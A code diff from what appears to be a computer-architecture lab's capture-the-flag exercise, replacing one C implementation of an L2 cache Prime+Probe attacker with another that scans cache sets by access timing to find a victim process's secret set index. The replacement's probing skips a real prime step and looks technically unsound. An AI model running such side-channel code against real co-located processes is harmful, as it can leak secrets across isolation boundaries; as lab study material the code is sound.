@@ -1,94 +1,71 @@
-/******************************************************
- * attacker.c - Capture the Flag using L2 Cache Prime+Probe
- *
- * This attacker scans every L2 cache set candidate and determines
- * which one exhibits a higher average latency due to victim interference.
- * The victim process continuously accesses its eviction set (for its
- * secret cache set index) in an infinite loop. Hence, the attacker’s
- * measurements on that candidate will be slower.
- *
- * Assumptions:
- *  - NUM_L2_CACHE_SETS is defined (the number of L2 cache sets)
- *  - EV_SET_SIZE is defined (number of addresses in an eviction set)
- *  - get_buffer(), get_partial_eviction_set() and measure_one_block_access_time()
- *    are provided in the lab’s util files.
- *
- * Build:
- *  Use the provided Makefile in Part3-CTF, e.g. by running:
- *      make run_attacker
- *
- * Testing:
- *  In one terminal, run:  make run_victim-N
- *  In another terminal, run: make run_attacker
- *  The attacker should print the detected flag (i.e. the target L2 set index).
- ******************************************************/
+#include "util.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <unistd.h>
 
- #include <stdio.h>
- #include <stdlib.h>
- #include <stdint.h>
- #include "util.h" // Ensure this header defines the prototypes and constants
- 
- // Number of times to repeat a measurement for each cache set candidate.
- // Adjust this value if your measurements are too noisy.
- #define NUM_PROBES 1000
- 
- int main(void) {
-     // Step 1: Allocate a hugepage-backed buffer.
-     char *buffer = get_buffer();
-     if (buffer == NULL) {
-         fprintf(stderr, "Error: Failed to allocate buffer via get_buffer()\n");
-         exit(EXIT_FAILURE);
-     }
- 
-     // Array to store the average measured latency (in cycles) for each L2 cache set candidate.
-     uint64_t avg_latency[NUM_L2_CACHE_SETS] = {0};
- 
-     // Step 2: For each candidate L2 cache set, construct an eviction set and measure access latency.
-     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
-         uint64_t latency_sum = 0;
-         // Prepare an eviction set for this candidate cache set.
-         // eviction_set is an array of pointers; its size is EV_SET_SIZE.
-         char *eviction_set[EV_SET_SIZE] = {0};
-         get_partial_eviction_set(eviction_set, set_index);
- 
-         // Repeat the prime/probe measurement to average out noise.
-         for (int probe = 0; probe < NUM_PROBES; probe++) {
-             // Prime phase: sequentially access every address in the eviction set.
-             // This brings them into the cache.
-             for (int i = 0; i < EV_SET_SIZE; i++) {
-                 volatile uint8_t dummy = eviction_set[i][0];  // volatile read to enforce access
-                 (void)dummy;  // prevent unused variable warning
-             }
- 
-             // (Optional) Insert a memory fence if necessary to prevent instruction reordering.
-             // e.g., asm volatile("lfence" ::: "memory");
- 
-             // Probe phase: measure the access latency for one element in the eviction set.
-             uint64_t t = measure_one_block_access_time((uint64_t *)eviction_set[0]);
-             latency_sum += t;
-         }
-         // Record the average latency for this cache set candidate.
-         avg_latency[set_index] = latency_sum / NUM_PROBES;
-     }
- 
-     // Step 3: Identify the cache set with the highest measured latency.
-     int detected_flag = 0;
-     uint64_t max_latency = 0;
-     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
-         if (avg_latency[set_index] > max_latency) {
-             max_latency = avg_latency[set_index];
-             detected_flag = set_index;
-         }
-     }
- 
-     // (Optional) Print detailed latencies for all sets for debugging purposes.
-     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
-         printf("Cache Set %3d: Average Latency = %llu cycles\n", set_index, avg_latency[set_index]);
-     }
-     
-     // Step 4: Output the detected secret flag.
-     printf("Detected victim flag (target L2 cache set index): %d\n", detected_flag);
- 
-     return 0;
- }
- 
+#define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
+#define L2_CACHE_SETS 2048          // Number of L2 cache sets on Skylake
+#define SAMPLE_RUNS 50              // Number of samples to average timings
+
+// Function to compute average access time for a specific cache set
+uint64_t probe_set(volatile uint8_t *buf, int set_index) {
+    uint64_t total_time = 0;
+    int samples = SAMPLE_RUNS;
+
+    for (int i = 0; i < samples; i++) {
+        volatile uint8_t *addr = buf + (set_index * 64) + (i * 4096);
+        total_time += measure_one_block_access_time((void *)addr);
+    }
+    return total_time / samples;
+}
+
+int main(int argc, char const *argv[]) {
+    int flag = -1;
+
+    // Step 1: Allocate a hugepage buffer
+    volatile uint8_t *buf = (volatile uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
+
+    if (buf == MAP_FAILED) {
+        perror("mmap error");
+        exit(1);
+    }
+
+    // Dummy write to ensure the page is allocated
+    buf[0] = 1;
+
+    printf("Attacker started. Monitoring cache sets...\n");
+
+    uint64_t timings[L2_CACHE_SETS];
+
+    while (1) {
+        // Step 2: Measure access time for each set
+        for (int set = 0; set < L2_CACHE_SETS; set++) {
+            timings[set] = probe_set(buf, set);
+        }
+
+        // Step 3: Find the slowest access set (highest latency)
+        uint64_t max_time = 0;
+        int candidate_flag = -1;
+
+        for (int set = 0; set < L2_CACHE_SETS; set++) {
+            if (timings[set] > max_time) {
+                max_time = timings[set];
+                candidate_flag = set;
+            }
+        }
+
+        // Basic filtering to avoid noise: only print if confident
+        if (max_time > 200) { // 200 cycles threshold (adjust if needed)
+            flag = candidate_flag;
+            printf("Flag: %d\n", flag);
+            break; // Successfully found the flag, exit
+        }
+
+        usleep(1000); // Sleep 1ms and try again if not confident
+    }
+
+    return 0;
+}
